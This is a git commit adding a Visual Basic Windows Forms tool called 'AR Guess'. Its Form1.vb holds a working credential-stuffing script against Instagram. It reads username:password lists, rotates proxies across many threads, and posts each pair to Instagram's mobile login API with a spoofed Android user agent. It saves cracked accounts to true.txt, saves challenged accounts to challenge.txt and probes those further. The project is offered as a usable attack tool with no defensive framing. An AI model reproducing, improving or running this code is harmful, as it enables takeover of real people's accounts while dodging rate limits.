5c5ba9c5f0629f3047e9a11755934a1e1d750d8f
Await <77535354+Onlyawait@users.noreply.github.com>
2021-08-29 00:31:54 +0300

    Add files via upload

---
+++ AR Guess/AR Guess/Form1.Designer.vb
@@ -0,0 +1,255 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.xThreading = New System.Windows.Forms.TextBox()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label4 = New System.Windows.Forms.Label()
+        Me.Label5 = New System.Windows.Forms.Label()
+        Me.Label6 = New System.Windows.Forms.Label()
+        Me.Label7 = New System.Windows.Forms.Label()
+        Me.Label8 = New System.Windows.Forms.Label()
+        Me.Label9 = New System.Windows.Forms.Label()
+        Me.Label10 = New System.Windows.Forms.Label()
+        Me.Label11 = New System.Windows.Forms.Label()
+        Me.Label12 = New System.Windows.Forms.Label()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.BackColor = System.Drawing.Color.Black
+        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button1.Location = New System.Drawing.Point(1, 50)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(75, 26)
+        Me.Button1.TabIndex = 0
+        Me.Button1.Text = "Start"
+        Me.Button1.UseVisualStyleBackColor = False
+        '
+        'xThreading
+        '
+        Me.xThreading.BackColor = System.Drawing.Color.Black
+        Me.xThreading.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.xThreading.ForeColor = System.Drawing.Color.White
+        Me.xThreading.Location = New System.Drawing.Point(1, 2)
+        Me.xThreading.Name = "xThreading"
+        Me.xThreading.Size = New System.Drawing.Size(75, 20)
+        Me.xThreading.TabIndex = 2
+        Me.xThreading.Text = "50"
+        Me.xThreading.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.BackColor = System.Drawing.Color.Black
+        Me.Label2.ForeColor = System.Drawing.Color.Green
+        Me.Label2.Location = New System.Drawing.Point(76, 7)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(46, 13)
+        Me.Label2.TabIndex = 6
+        Me.Label2.Text = "logged :"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.BackColor = System.Drawing.Color.Black
+        Me.Label3.ForeColor = System.Drawing.Color.Red
+        Me.Label3.Location = New System.Drawing.Point(76, 45)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(50, 13)
+        Me.Label3.TabIndex = 8
+        Me.Label3.Text = "Secure : "
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.BackColor = System.Drawing.Color.Black
+        Me.Label1.ForeColor = System.Drawing.Color.Red
+        Me.Label1.Location = New System.Drawing.Point(124, 45)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(13, 13)
+        Me.Label1.TabIndex = 9
+        Me.Label1.Text = "0"
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.BackColor = System.Drawing.Color.Black
+        Me.Label4.ForeColor = System.Drawing.Color.Green
+        Me.Label4.Location = New System.Drawing.Point(124, 7)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(13, 13)
+        Me.Label4.TabIndex = 10
+        Me.Label4.Text = "0"
+        '
+        'Label5
+        '
+        Me.Label5.AutoSize = True
+        Me.Label5.BackColor = System.Drawing.Color.Black
+        Me.Label5.ForeColor = System.Drawing.Color.Green
+        Me.Label5.Location = New System.Drawing.Point(76, 25)
+        Me.Label5.Name = "Label5"
+        Me.Label5.Size = New System.Drawing.Size(51, 13)
+        Me.Label5.TabIndex = 12
+        Me.Label5.Text = "Number :"
+        '
+        'Label6
+        '
+        Me.Label6.AutoSize = True
+        Me.Label6.BackColor = System.Drawing.Color.Black
+        Me.Label6.ForeColor = System.Drawing.Color.Green
+        Me.Label6.Location = New System.Drawing.Point(124, 25)
+        Me.Label6.Name = "Label6"
+        Me.Label6.Size = New System.Drawing.Size(13, 13)
+        Me.Label6.TabIndex = 13
+        Me.Label6.Text = "0"
+        '
+        'Label7
+        '
+        Me.Label7.AutoSize = True
+        Me.Label7.BackColor = System.Drawing.Color.Black
+        Me.Label7.ForeColor = System.Drawing.Color.White
+        Me.Label7.Location = New System.Drawing.Point(123, 63)
+        Me.Label7.Name = "Label7"
+        Me.Label7.Size = New System.Drawing.Size(13, 13)
+        Me.Label7.TabIndex = 14
+        Me.Label7.Text = "0"
+        '
+        'Label8
+        '
+        Me.Label8.AutoSize = True
+        Me.Label8.BackColor = System.Drawing.Color.Black
+        Me.Label8.ForeColor = System.Drawing.Color.White
+        Me.Label8.Location = New System.Drawing.Point(76, 63)
+        Me.Label8.Name = "Label8"
+        Me.Label8.Size = New System.Drawing.Size(43, 13)
+        Me.Label8.TabIndex = 15
+        Me.Label8.Text = "Count :"
+        '
+        'Label9
+        '
+        Me.Label9.AutoSize = True
+        Me.Label9.BackColor = System.Drawing.Color.Black
+        Me.Label9.ForeColor = System.Drawing.Color.Red
+        Me.Label9.Location = New System.Drawing.Point(39, 81)
+        Me.Label9.Name = "Label9"
+        Me.Label9.Size = New System.Drawing.Size(13, 13)
+        Me.Label9.TabIndex = 17
+        Me.Label9.Text = "0"
+        '
+        'Label10
+        '
+        Me.Label10.AutoSize = True
+        Me.Label10.BackColor = System.Drawing.Color.Black
+        Me.Label10.ForeColor = System.Drawing.Color.Red
+        Me.Label10.Location = New System.Drawing.Point(3, 81)
+        Me.Label10.Name = "Label10"
+        Me.Label10.Size = New System.Drawing.Size(40, 13)
+        Me.Label10.TabIndex = 16
+        Me.Label10.Text = "wait  : "
+        '
+        'Label11
+        '
+        Me.Label11.AutoSize = True
+        Me.Label11.BackColor = System.Drawing.Color.Black
+        Me.Label11.ForeColor = System.Drawing.Color.White
+        Me.Label11.Location = New System.Drawing.Point(3, 103)
+        Me.Label11.Name = "Label11"
+        Me.Label11.Size = New System.Drawing.Size(30, 13)
+        Me.Label11.TabIndex = 19
+        Me.Label11.Text = "List :"
+        '
+        'Label12
+        '
+        Me.Label12.AutoSize = True
+        Me.Label12.BackColor = System.Drawing.Color.Black
+        Me.Label12.ForeColor = System.Drawing.Color.White
+        Me.Label12.Location = New System.Drawing.Point(39, 103)
+        Me.Label12.Name = "Label12"
+        Me.Label12.Size = New System.Drawing.Size(13, 13)
+        Me.Label12.TabIndex = 18
+        Me.Label12.Text = "0"
+        '
+        'Button2
+        '
+        Me.Button2.BackColor = System.Drawing.Color.Black
+        Me.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button2.Location = New System.Drawing.Point(1, 23)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(75, 26)
+        Me.Button2.TabIndex = 20
+        Me.Button2.Text = "Add list"
+        Me.Button2.UseVisualStyleBackColor = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.Color.Black
+        Me.ClientSize = New System.Drawing.Size(180, 125)
+        Me.Controls.Add(Me.Button2)
+        Me.Controls.Add(Me.Label11)
+        Me.Controls.Add(Me.Label12)
+        Me.Controls.Add(Me.Label9)
+        Me.Controls.Add(Me.Label10)
+        Me.Controls.Add(Me.Label8)
+        Me.Controls.Add(Me.Label7)
+        Me.Controls.Add(Me.Label6)
+        Me.Controls.Add(Me.Label5)
+        Me.Controls.Add(Me.Label4)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.xThreading)
+        Me.Controls.Add(Me.Button1)
+        Me.ForeColor = System.Drawing.Color.White
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow
+        Me.MaximumSize = New System.Drawing.Size(196, 164)
+        Me.MinimumSize = New System.Drawing.Size(196, 164)
+        Me.Name = "Form1"
+        Me.Text = "AR Guess"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Button1 As Button
+    Friend WithEvents xThreading As TextBox
+    Friend WithEvents Label2 As Label
+    Friend WithEvents Label3 As Label
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label4 As Label
+    Friend WithEvents Label5 As Label
+    Friend WithEvents Label6 As Label
+    Friend WithEvents Label7 As Label
+    Friend WithEvents Label8 As Label
+    Friend WithEvents Label9 As Label
+    Friend WithEvents Label10 As Label
+    Friend WithEvents Label11 As Label
+    Friend WithEvents Label12 As Label
+    Friend WithEvents Button2 As Button
+End Class
---
+++ AR Guess/AR Guess/Form1.vb
@@ -0,0 +1,197 @@
+﻿Imports System.Net
+Imports System.IO
+Imports System.Threading
+Imports System.Text
+Imports Microsoft.VisualBasic.CompilerServices
+Imports System.Text.RegularExpressions
+Public Class Form1
+    '// Demon                               824   
+    '// Inst                               @_824
+    Public ListCounts As Integer
+    Public list As String()
+    Public ProxiesCounts As Integer
+    Public Proxies As List(Of String) = New List(Of String)(File.ReadAllLines("proxies.txt"))
+    Public StopCheck As Boolean
+    Public Username As String
+    Public Password As String
+    Public Mid As String
+    Public Token As String
+    Public Cookie As CookieContainer = New CookieContainer()
+    Public StopSend As Boolean = False
+    Private Sub ThreadingSystem()
+        '// Demon 824 
+        '// Inst @_824
+        Dim num As Integer = Conversions.ToInteger(xThreading.Text)
+        Dim Random = New Random()
+        Dim i As Integer = 0
+        Try
+            Do While i <= num
+                Dim Threading As Thread = New Thread(New ThreadStart(AddressOf ListSystem))
+                Threading.Start()
+                Thread.Sleep(Random.Next(700, 1500))
+                i += 1
+            Loop
+        Catch ex As Exception
+        End Try
+    End Sub
+    '// Demon 824 
+    '// Inst @_824
+    Private Sub ListSystem()
+        '// Demon 824 
+        '// Inst @_824
+        While Not StopCheck
+            Dim Random = New Random()
+            Try
+                Dim text As String
+                text = list(0)
+                ListCounts += 1
+                If ListCounts > list.Length Then
+                    ListCounts = 0
+                End If
+                text = list(ListCounts)
+                If text.Contains(":") Then
+                    Username = text.Split(New Char() {":"c})(0).Trim()
+                    Password = text.Split(New Char() {":"c})(1).Trim()
+                End If
+                ProxiesCounts += 1
+                If ProxiesCounts > Proxies.Count - 1 Then
+                    ProxiesCounts = 0
+                End If
+                LogGuess(Username, Password, Proxies(ProxiesCounts))
+            Catch ex As Exception
+            End Try
+            Thread.Sleep(Random.Next(700, 1500))
+        End While
+    End Sub
+    '// Demon 824 
+    '// Inst @_824
+    Private Function LogGuess(user As String, pass As String, proxy As String) As Object
+        '// Demon 824 
+        '// Inst @_824
+        Try
+            Dim Guidd = Guid.NewGuid().ToString()
+            Dim bytes As Byte() = Encoding.UTF8.GetBytes(String.Concat(New String() {"reg_login=0&login_attempt_count=0&device_id=", Guidd, "&phone_id=", Guidd, "&password=", Password, "&username=", Username}))
+            With DirectCast(WebRequest.Create("https://i.instagram.com/api/v1/accounts/login/"), HttpWebRequest)
+                .Proxy = New WebProxy(proxy)
+                .Method = "POST"
+                .Host = "i.instagram.com"
+                .UserAgent = "Instagram 8.14.0 Android (18/4.4.2; 320dpi; 720x1280; samsung; GT-I9301I; s3ve3g; qcom; bg_BG)"
+                .ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
+                .Headers.Add("Accept-Language", "en;q=1")
+                .ContentLength = bytes.Length
+                .Pipelined = True
+                .KeepAlive = True
+                .Timeout = 100000
+                .CookieContainer = New CookieContainer()
+                .ServicePoint.Expect100Continue = False
+                .ServicePoint.UseNagleAlgorithm = False
+                .ServicePoint.ConnectionLimit = Integer.MaxValue
+                .ServicePoint.ConnectionLeaseTimeout = 100000
+                With .GetRequestStream()
+                    .Write(bytes, 0, bytes.Length) : .Close()
+                End With
+                Dim WebResponse As HttpWebResponse : Try : WebResponse = DirectCast(.GetResponse(), HttpWebResponse) : Catch ex As WebException : WebResponse = DirectCast(ex.Response(), HttpWebResponse) : End Try
+                Using StreamReader As StreamReader = New StreamReader(WebResponse.GetResponseStream())
+                    Dim Respon = StreamReader.ReadToEnd
+                    If Respon.Contains("logged_in_user") Then
+                        Label4.Text += 1
+                        My.Computer.FileSystem.WriteAllText("true.txt", String.Concat(New String() {user, ":" + pass + vbCrLf}), True)
+                    ElseIf Respon.Contains("challenge") Then
+                        Label1.Text += 1
+                        My.Computer.FileSystem.WriteAllText("challenge.txt", String.Concat(New String() {user, ":" + pass + vbCrLf}), True)
+                        Return Send_rest(user, pass, proxy)
+                    ElseIf Respon.Contains("Please wait") Or Respon.Contains("rate_limit_error") Or Respon.Contains("generic_request_error") Then
+                        Label9.Text += 1
+                    Else
+                        Label7.Text += 1
+                    End If
+                End Using
+            End With
+        Catch ex As Exception
+        End Try
+        Return False
+    End Function
+    '// Demon 824 
+    '// Inst @_824
+    Private Function Send_rest(user As String, pass As String, proxy As String) As Object
+        '// Demon 824 
+        '// Inst @_824
+        Try
+            Dim random = New Random()
+            Dim Guidd = Guid.NewGuid().ToString()
+            Dim bytes As Byte() = Encoding.UTF8.GetBytes(String.Concat(New String() {"username_or_email=", user, "&device_id=", Guidd}))
+            With DirectCast(WebRequest.Create("https://i.instagram.com/api/v1/accounts/sign_in_help/"), HttpWebRequest)
+                .Proxy = New WebProxy(proxy)
+                .Method = "POST"
+                .Host = "i.instagram.com"
+                .UserAgent = "Instagram 8.14.0 Android (18/4.4.2; 320dpi; 720x1280; samsung; GT-I9301I; s3ve3g; qcom; bg_BG)"
+                .ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
+                .Headers.Add("Accept-Language", "en;q=1")
+                .ContentLength = bytes.Length
+                .Pipelined = True
+                .KeepAlive = True
+                .Timeout = 100000
+                .CookieContainer = New CookieContainer()
+                .ServicePoint.Expect100Continue = False
+                .ServicePoint.UseNagleAlgorithm = False
+                .ServicePoint.ConnectionLimit = Integer.MaxValue
+                .ServicePoint.ConnectionLeaseTimeout = 100000
+                With .GetRequestStream()
+                    .Write(bytes, 0, bytes.Length) : .Close()
+                End With
+                Dim WebResponse As HttpWebResponse : Try : WebResponse = DirectCast(.GetResponse(), HttpWebResponse) : Catch ex As WebException : WebResponse = DirectCast(ex.Response(), HttpWebResponse) : End Try
+                Using StreamReader As StreamReader = New StreamReader(WebResponse.GetResponseStream())
+                    Dim Respon = StreamReader.ReadToEnd
+                    If Respon.Contains("user_not_found") Then
+                        Label6.Text += 1
+                        My.Computer.FileSystem.WriteAllText("Need Number.txt", String.Concat(New String() {user, ":" + pass + vbCrLf}), True)
+                    ElseIf Respon.Contains("Please wait") Then
+                        Return Send_rest(user, pass, proxy)
+                    End If
+                End Using
+            End With
+        Catch ex As Exception
+        End Try
+        Return False
+    End Function
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        '// Demon 824 
+        '// Inst @_824
+        Dim thread As Thread = New Thread(New ThreadStart(AddressOf ThreadingSystem))
+        thread.Start()
+    End Sub
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        '// Demon 824 
+        '// Inst @_824
+        Try
+            Dim openFile = New OpenFileDialog With {
+                .CheckFileExists = True,
+                .CheckPathExists = True,
+                .DefaultExt = "txt",
+                .Multiselect = False,
+                .Filter = "list(*.txt)|*.txt"
+            }
+            If openFile.ShowDialog() = DialogResult.OK Then
+                list = File.ReadAllLines(openFile.FileName)
+                Dim source As List(Of String) = New List(Of String)(list)
+                list = source.[Select](Function(s As String) s).Distinct().ToArray()
+                Label12.Text = list.Length
+            End If
+        Catch ex As Exception
+            MsgBox("Error")
+        End Try
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        ThreadPool.SetMinThreads(Integer.MaxValue, Integer.MaxValue)
+        ServicePointManager.DefaultConnectionLimit = Integer.MaxValue
+    End Sub
+    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles MyBase.Closed
+        End
+    End Sub
+    Private Sub Label11_Click(sender As Object, e As EventArgs) Handles Label11.Click
+
+    End Sub
+    Private Sub Label12_Click(sender As Object, e As EventArgs) Handles Label12.Click
+        Label12.Text = list.Length
+    End Sub
+End Class
